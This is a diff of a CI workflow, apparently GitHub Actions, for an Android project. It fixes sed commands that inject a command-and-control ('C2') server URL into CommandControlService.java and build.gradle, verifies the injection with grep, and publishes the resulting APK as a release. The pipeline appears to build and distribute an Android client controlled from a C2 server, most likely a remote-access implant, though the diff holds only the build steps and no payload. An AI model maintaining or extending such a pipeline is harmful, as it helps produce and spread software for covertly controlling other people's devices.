@@ -84,13 +84,14 @@ jobs:
           # 1) Patch the runtime constant in CommandControlService.java
           sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${ESC_URL}\";|g" "${{ env.CCS }}"
 
-          # 2) Patch the BuildConfig field in app/build.gradle (used by some components)
-          sed -i "s|SERVER_URL\", \"[^\"]*\"|SERVER_URL\", \"${ESC_URL}\"|g" android/app/build.gradle
+          # 2) Patch the BuildConfig field in app/build.gradle
+          #    Value is wrapped in single quotes: '"wss://..."' — match that form
+          sed -i "s|SERVER_URL\", '[^']*'|SERVER_URL\", '${ESC_URL}'|g" android/app/build.gradle
 
           # 3) Verify both landed
           grep -q "SERVER_URL = \"${ESC_URL}\"" "${{ env.CCS }}" \
             || { echo "::error::C2 URL injection failed in CommandControlService.java"; exit 1; }
-          grep -q "SERVER_URL\", \"${ESC_URL}\"" android/app/build.gradle \
+          grep -q "SERVER_URL\", '${ESC_URL}'" android/app/build.gradle \
             || { echo "::error::C2 URL injection failed in build.gradle BuildConfig"; exit 1; }
 
           echo "Injected C2 URL: $URL"
@@ -283,4 +284,5 @@ jobs:
           files: "${{ env.APK_NAME }}"
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
           
